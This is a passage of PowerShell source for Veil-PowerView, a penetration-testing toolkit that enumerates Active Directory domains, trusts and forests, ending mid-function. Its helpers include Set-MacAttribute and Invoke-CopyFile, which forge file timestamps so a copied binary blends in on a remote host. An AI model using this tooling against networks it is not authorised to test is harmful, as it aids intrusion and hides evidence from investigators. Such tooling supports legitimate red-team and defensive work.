#requires -version 2

<#

Veil-PowerView v1.6

See README.md for more information.

by @harmj0y
#>


function New-InMemoryModule
{
    <#
        .SYNOPSIS

        Creates an in-memory assembly and module

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
 
        .DESCRIPTION

        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.

        .PARAMETER ModuleName

        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.

        .EXAMPLE

        $Module = New-InMemoryModule -ModuleName Win32
    #>

    [OutputType([Reflection.Emit.ModuleBuilder])]
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
# Author: Matthew Graeber (@mattifestation)
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
    <#
        .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func
 
        .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

        .PARAMETER DllName

        The name of the DLL.

        .PARAMETER FunctionName

        The name of the target function.

        .PARAMETER ReturnType

        The return type of the function.

        .PARAMETER ParameterTypes

        The function parameters.

        .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

        .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

        .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

        .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

        .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

        .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
        (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
        (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
        (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

        .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
    #>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [Reflection.Emit.ModuleBuilder]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        # Define one type for each DLL
        if (!$TypeHash.ContainsKey($DllName))
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
            }
            else
            {
                $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
            }
        }

        $Method = $TypeHash[$DllName].DefineMethod(
            $FunctionName,
            'Public,Static,PinvokeImpl',
            $ReturnType,
            $ParameterTypes)

        # Make each ByRef parameter an Out parameter
        $i = 1
        foreach($Parameter in $ParameterTypes)
        {
            if ($Parameter.IsByRef)
            {
                [void] $Method.DefineParameter($i, 'Out', $null)
            }

            $i++
        }

        $DllImport = [Runtime.InteropServices.DllImportAttribute]
        $SetLastErrorField = $DllImport.GetField('SetLastError')
        $CallingConventionField = $DllImport.GetField('CallingConvention')
        $CharsetField = $DllImport.GetField('CharSet')
        if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

        # Equivalent to C# version of [DllImport(DllName)]
        $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
        $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
            $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
            [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
            [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

        $Method.SetCustomAttribute($DllImportAttribute)
    }

    END
    {
        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            
            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


# A helper function used to reduce typing while defining struct
# fields.
# Author: Matthew Graeber (@mattifestation)
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

# Author: Matthew Graeber (@mattifestation)
function struct
{
    <#
        .SYNOPSIS

        Creates an in-memory struct for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: field
 
        .DESCRIPTION

        The 'struct' function facilitates the creation of structs entirely in
        memory using as close to a "C style" as PowerShell will allow. Struct
        fields are specified using a hashtable where each field of the struct
        is comprosed of the order in which it should be defined, its .NET
        type, and optionally, its offset and special marshaling attributes.

        One of the features of 'struct' is that after your struct is defined,
        it will come with a built-in GetSize method as well as an explicit
        converter so that you can easily cast an IntPtr to the struct without
        relying upon calling SizeOf and/or PtrToStructure in the Marshal
        class.

        .PARAMETER Module

        The in-memory module that will host the struct. Use
        New-InMemoryModule to define an in-memory module.

        .PARAMETER FullName

        The fully-qualified name of the struct.

        .PARAMETER StructFields

        A hashtable of fields. Use the 'field' helper function to ease
        defining each field.

        .PARAMETER PackingSize

        Specifies the memory alignment of fields.

        .PARAMETER ExplicitLayout

        Indicates that an explicit offset for each field will be specified.

        .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageDosSignature = enum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
        }

        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
        }

        # Example of using an explicit layout in order to create a union.
        $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
        } -ExplicitLayout

        .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Struct. :P
    #>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [Reflection.Emit.ModuleBuilder]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


function Get-ShuffledArray {
    <#
        .SYNOPSIS
        Returns a randomly-shuffled version of a passed array.
        
        .DESCRIPTION
        This function takes an array and returns a randomly-shuffled
        version.
        
        .PARAMETER Array
        The passed array to shuffle.

        .OUTPUTS
        System.Array. The passed array but shuffled.
        
        .EXAMPLE
        > $shuffled = Get-ShuffledArray $array
        Get a shuffled version of $array.

        .LINK
        http://sqlchow.wordpress.com/2013/03/04/shuffle-the-deck-using-powershell/
    #>
    [CmdletBinding()]
    param( 
        [Array]$Array 
    )
    Begin{}
    Process{
        $len = $Array.Length
        while($len){
            $i = Get-Random ($len --)
            $tmp = $Array[$len]
            $Array[$len] = $Array[$i]
            $Array[$i] = $tmp
        }
        $Array;
    }
}


function Invoke-CheckWrite {
    <#
        .SYNOPSIS
        Check if the current user has write access to a given file.
        
        .DESCRIPTION
        This function tries to open a given file for writing and then
        immediately closes it, returning true if the file successfully
        opened, and false if it failed.
        
        .PARAMETER Path
        Path of the file to check for write access.

        .OUTPUTS
        System.bool. True if the add succeeded, false otherwise.
        
        .EXAMPLE
        > Invoke-CheckWrite "test.txt"
        Check if the current user has write access to "test.txt"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String] $Path
    )
    Begin{}
    
    Process{
        try { 
            $filetest = [IO.FILE]::OpenWrite($Path)
            $filetest.close()
            $true
        }
        catch {
            Write-Verbose -Message $Error[0]
            $false
        }
    }
    
    End{}
}


# stolen directly from http://poshcode.org/1590
# Requires -Version 2.0
<#
  This Export-CSV behaves exactly like native Export-CSV
  However it has one optional switch -Append
  Which lets you append new data to existing CSV file: e.g.
  Get-Process | Select ProcessName, CPU | Export-CSV processes.csv -Append
  
  For details, see
  http://dmitrysotnikov.wordpress.com/2010/01/19/export-csv-append/
  
  (c) Dmitry Sotnikov
#>
function Export-CSV {
    [CmdletBinding(DefaultParameterSetName='Delimiter',
            SupportsShouldProcess=$true, 
    ConfirmImpact='Medium')]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true)]
        [System.Management.Automation.PSObject]
        $InputObject,
        
        [Parameter(Mandatory=$true, Position=0)]
        [Alias('PSPath')]
        [System.String]
        $Path,
        
        #region -Append (added by Dmitry Sotnikov)
        [Switch]
        $Append,
        #endregion 
        
        [Switch]
        $Force,
        
        [Switch]
        $NoClobber,
        
        [ValidateSet('Unicode','UTF7','UTF8','ASCII','UTF32','BigEndianUnicode','Default','OEM')]
        [System.String]
        $Encoding,
        
        [Parameter(ParameterSetName='Delimiter', Position=1)]
        [ValidateNotNull()]
        [System.Char]
        $Delimiter,
        
        [Parameter(ParameterSetName='UseCulture')]
        [Switch]
        $UseCulture,
        
        [Alias('NTI')]
        [Switch]
        $NoTypeInformation
    )
    
    Begin
    {
        # This variable will tell us whether we actually need to append
        # to existing file
        $AppendMode = $false
        
        try {
            $outBuffer = $null
            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
            {
                $PSBoundParameters['OutBuffer'] = 1
            }
            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Export-Csv',
            [System.Management.Automation.CommandTypes]::Cmdlet)
            
            
            #String variable to become the target command line
            $scriptCmdPipeline = ''
            
            # Add new parameter handling
            #region Dmitry: Process and remove the Append parameter if it is present
            if ($Append) {
                
                $PSBoundParameters.Remove('Append') | Out-Null
                
                if ($Path) {
                    if (Test-Path -Path $Path) {        
                        # Need to construct new command line
                        $AppendMode = $true
                        
                        if ($Encoding.Length -eq 0) {
                            # ASCII is default encoding for Export-CSV
                            $Encoding = 'ASCII'
                        }
                        
                        # For Append we use ConvertTo-CSV instead of Export
                        $scriptCmdPipeline += 'ConvertTo-Csv -NoTypeInformation '
                        
                        # Inherit other CSV convertion parameters
                        if ( $UseCulture ) {
                            $scriptCmdPipeline += ' -UseCulture '
                        }
                        
                        if ( $Delimiter ) {
                            $scriptCmdPipeline += " -Delimiter '$Delimiter' "
                        } 
                        
                        # Skip the first line (the one with the property names) 
                        $scriptCmdPipeline += ' | Foreach-Object {$start=$true}'
                        $scriptCmdPipeline += '{if ($start) {$start=$false} else {$_}} '
                        
                        # Add file output
                        $scriptCmdPipeline += " | Out-File -FilePath '$Path' -Encoding '$Encoding' -Append "
                        
                        if ($Force) {
                            $scriptCmdPipeline += ' -Force'
                        }
                        
                        if ($NoClobber) {
                            $scriptCmdPipeline += ' -NoClobber'
                        }   
                    }
                }
            } 
            $scriptCmd = {& $wrappedCmd @PSBoundParameters }
            
            if ( $AppendMode ) {
                # redefine command line
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    $scriptCmdPipeline
                )
            } else {
                # execute Export-CSV as we got it because
                # either -Append is missing or file does not exist
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    [string]$scriptCmd
                )
            }
            
            # standard pipeline initialization
            $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
            $steppablePipeline.Begin($PSCmdlet)
            
        } 
        catch {
            throw
        }
    }
    
    process
    {
        try {
            $steppablePipeline.Process($_)
        } catch {
            throw
        }
    }
    
    end
    {
        try {
            $steppablePipeline.End()
        } catch {
            throw
        }
    }
<#

.ForwardHelpTargetName Export-Csv
.ForwardHelpCategory Cmdlet

#>
    
}



# The following three conversation functions were
# stolen from http://poshcode.org/3385
#to convert Hex to Dec
function Convert-HEXtoDEC
{
    param($HEX)
    ForEach ($value in $HEX)
    {
        [string][Convert]::ToInt32($value,16)
    }
}


function Reassort
{
    #to reassort decimal values to correct hex in order to cenvert them
    param($chaine)
    
    $a = $chaine.substring(0,2)
    $b = $chaine.substring(2,2)
    $c = $chaine.substring(4,2)
    $d = $chaine.substring(6,2)
    $d+$c+$b+$a
}


function ConvertSID
{
    param($bytes)
    
    try{
        # convert byte array to string
        $chaine32 = -join ([byte[]]($bytes) | ForEach-Object {$_.ToString('X2')})
        foreach($chaine in $chaine32) {
            [INT]$SID_Revision = $chaine.substring(0,2)
            [INT]$Identifier_Authority = $chaine.substring(2,2)
            [INT]$Security_NT_Non_unique = Convert-HEXtoDEC(Reassort($chaine.substring(16,8)))
            $chaine1 = $chaine.substring(24,8)
            $chaine2 = $chaine.substring(32,8)
            $chaine3 = $chaine.substring(40,8)
            $chaine4 = $chaine.substring(48,8)
            [string]$MachineID_1=Convert-HextoDEC(Reassort($chaine1))
            [string]$MachineID_2=Convert-HextoDEC(Reassort($chaine2))
            [string]$MachineID_3=Convert-HextoDEC(Reassort($chaine3))
            [string]$UID=Convert-HextoDEC(Reassort($chaine4))
            #"S-1-5-21-" + $MachineID_1 + "-" + $MachineID_2 + "-" + $MachineID_3 + "-" + $UID
            "S-$SID_revision-$Identifier_Authority-$Security_NT_Non_unique-$MachineID_1-$MachineID_2-$MachineID_3-$UID"
        }
    }
    catch {
        'ERROR'
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
    .SYNOPSIS

        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

        PowerSploit Function: Set-MacAttribute
        Author: Chris Campbell (@obscuresec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        Version: 1.0.0
     
    .DESCRIPTION

        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

    .LINK
        
        http://www.obscuresec.com/2014/05/touch.html
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')] 
    Param (
        
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FilePath,
        
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OldFilePath,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,
        
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )
    
    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {
        
        param($OldFileName)
        
        if (!(Test-Path -Path $OldFileName)){Throw 'File Not Found'}
        $FileInfoObject = (Get-Item $OldFileName)
        
        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    } 
    
    #test and set variables
    if (!(Test-Path -Path $FilePath)){Throw "$FilePath not found"}
    
    $FileInfoObject = (Get-Item -Path $FilePath)
    
    if ($PSBoundParameters['AllMacAttributes']){
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }
    
    if ($PSBoundParameters['OldFilePath']){
        
        if (!(Test-Path -Path $OldFilePath)){Write-Error "$OldFilePath not found."}
        
        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }
    
    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}
    
    Return (Get-MacAttribute $FilePath)
}


function Invoke-CopyFile {
    <#
        .SYNOPSIS
        Copy a source file to a destination location, matching any MAC
        properties as appropriate.
        
        .DESCRIPTION
        This function copies a given file to a remote location. If the destination
        path already exists, this function will copy the MAC properties
        from the file.
        
        .PARAMETER SourceFile
        Source file to copy.

        .PARAMETER DestFile
        Destination file path to copy file to.
        
        .EXAMPLE
        > Invoke-CopyFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
        Copy the local program.exe binary to a remote location,
        matching the MAC properties of the remote exe.

        .LINK
        http://obscuresecurity.blogspot.com/2014/05/touch.html
    #>
    
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        $DestFile
    )
    
    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile
    
    # copy the file off
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-HostIP {
    <#
    .SYNOPSIS
    Takes a hostname and resolves it an IP.
    
    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.
    
    .OUTPUTS
    System.String. The IPv4 address.
    
    .EXAMPLE
    > Get-HostIP -hostname SERVER
    Return the IPv4 address of 'SERVER'
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $hostname = ''
    )
    try{
        # get the IP resolution of this specified hostname
        $results = @(([net.dns]::GetHostEntry($hostname)).AddressList)
        
        if ($results.Count -ne 0){
            foreach ($result in $results) {
                # make sure the returned result is IPv4
                if ($result.AddressFamily -eq 'InterNetwork') {
                    $result.IPAddressToString
                }
            }
        }
    }
    catch{ 
        Write-Verbose -Message 'Could not resolve host to an IP Address.'
    }
}


function Test-Server {
    <#
        .SYNOPSIS
        Tests a connection to a remote server.
        
        .DESCRIPTION
        This function uses either ping (test-connection) or RPC
        (through WMI) to test connectivity to a remote server.

        .PARAMETER Server
        The hostname/IP to test connectivity to.

        .OUTPUTS
        $True/$False
        
        .EXAMPLE
        > Test-Server -Server WINDOWS7
        Tests ping connectivity to the WINDOWS7 server.

        .EXAMPLE
        > Test-Server -RPC -Server WINDOWS7
        Tests RPC connectivity to the WINDOWS7 server.

        .LINK
        http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String] 
        $Server,
        
        [Switch]
        $RPC
    )
    
    if ($RPC){
        $WMIParameters = @{
                        namespace = 'root\cimv2'
                        Class = 'win32_ComputerSystem'
                        ComputerName = $Name
                        ErrorAction = 'Stop'
                      }
        if ($Credential -ne $null)
        {
            $WMIParameters.Credential = $Credential
        }
        try
        {
            Get-WmiObject @WMIParameters
        }
        catch { 
            Write-Verbose -Message 'Could not connect via WMI'
        } 
    }
    # otherwise, use ping
    else{
        Test-Connection -ComputerName $Server -count 1 -Quiet
    }
}


########################################################
#
# Domain and forest info/trust functions below.
#
########################################################

function Get-NetDomain {
    <#
        .SYNOPSIS
        Returns the name of the current user's domain.
        
        .DESCRIPTION
        This function utilizes ADSI (Active Directory Service Interface) to
        get the currect domain root and return its distinguished name.
        It then formats the name into a single string.
        
        .PARAMETER Base
        Just return the base of the current domain (i.e. no .com)

        .OUTPUTS
        System.String. The full domain name.
        
        .EXAMPLE
        > Get-NetDomain
        Return the current domain.

        .EXAMPLE
        > Get-NetDomain -base
        Return just the base of the current domain.

        .LINK
        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
    #>
    
    [CmdletBinding()]
    param(
        [Switch]
        $Base
    )
    
    # just get the base of the domain name
    if ($Base){
        $temp = [string] ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
        $parts = $temp.split('.')
        $parts[0..($parts.length-2)] -join '.'
    }
    else{
        ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
    }
}


function Get-NetDomainTrusts {
    <#
        .SYNOPSIS
        Return all domain trusts for the current domain or
        a specified domain.
        
        .DESCRIPTION
        This function returns all current trusts associated
        with the current domain.

        .PARAMETER Domain
        The domain whose trusts to enumerate. If not given, 
        uses the current domain.

        .EXAMPLE
        > Get-NetDomainTrusts
        Return domain trusts for the current domain.

        .EXAMPLE
        > Get-NetDomainTrusts -Domain "test"
        Return domain trusts for the "test" domain.  
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){
        
        try{
            # try to create the context for the target domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext).GetAllTrustRelationships()
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $null
        }
    }
    else{
        # otherwise, grab the current domain
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()
    }
}


function Get-NetForest {
    <#
        .SYNOPSIS
        Returns the forest specified, or the current forest 
        associated with this domain,
        
        .DESCRIPTION
        This function returns the current forest associated 
        with the domain the current user is authenticated to,
        or the specified forest.
      
        .PARAMETER Forest
        Return the specified forest.

        .EXAMPLE
        > Get-NetForest
        Return current forest.
    #>
  
    [CmdletBinding()]
    param(
        [string]
        $Forest
    )
    
    if($Forest){
        # if a forest is specified, try to grab that forest
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try{
            [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch{
